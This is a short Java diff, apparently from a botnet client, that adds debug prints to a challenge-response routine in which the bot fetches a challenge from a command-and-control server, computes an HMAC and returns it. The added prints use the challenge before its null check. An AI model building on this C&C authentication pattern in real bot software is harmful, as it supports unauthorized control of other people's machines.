@@ -64,13 +64,20 @@ private boolean challengeToCommandConquer(){
 		
 	Pairs<Long,Long> challenge=request.getChallengeFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0));
 	
+	System.out.println("Rnd Number "+challenge.getValue1());
+	System.out.println("Rnd Iteration Number "+challenge.getValue2());
+	
 	
 	if(challenge!=null){
+		
+		//System.out.println("Challenge Positvi");
+		
 		//TODO richiesta di challenge
 		String key=auth.generateStringKey(challenge.getValue2());
+		System.out.println("1");
 		String hashMac=auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-		System.out.println(challenge.getValue1());
-		System.out.println(challenge.getValue2());
+		System.out.println("Rnd Number "+challenge.getValue1());
+		System.out.println("Rnd Iteration Number "+challenge.getValue2());
 		System.out.println(hashMac);
 		
 		String response=request.getResponseFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0),challenge.getValue1(), challenge.getValue2(), hashMac);
